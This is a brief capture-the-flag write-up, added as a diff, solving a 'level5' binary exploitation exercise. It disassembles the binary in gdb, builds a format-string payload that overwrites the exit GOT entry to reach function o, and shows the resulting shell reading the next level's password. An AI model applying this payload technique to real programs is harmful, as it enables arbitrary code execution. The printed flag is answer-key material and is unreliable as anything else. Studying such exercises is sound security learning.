@@ -1,0 +1,40 @@
+Like previous levels, i will use format string but this time to change exit got address.
+
+(gdb) disassemble main
+
+0x0804850a <+6>:	call   0x80484c2 <n>
+
+(gdb) info function
+
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+
+(gdb) disass n
+
+0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+
+(gdb) disass 0x80483d0
+
+0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
+
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+
+printf use th 4th arg.
+
+function o address in decimal is 134513828 - 4bytes of exit address
+
+python -c "print('\x38\x98\x04\x08%4\$134513824x%4\$n')" > pl
+
+cat pl - | ./level5
+…….
+whoami
+level6
+cd ..
+cd level6
+cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
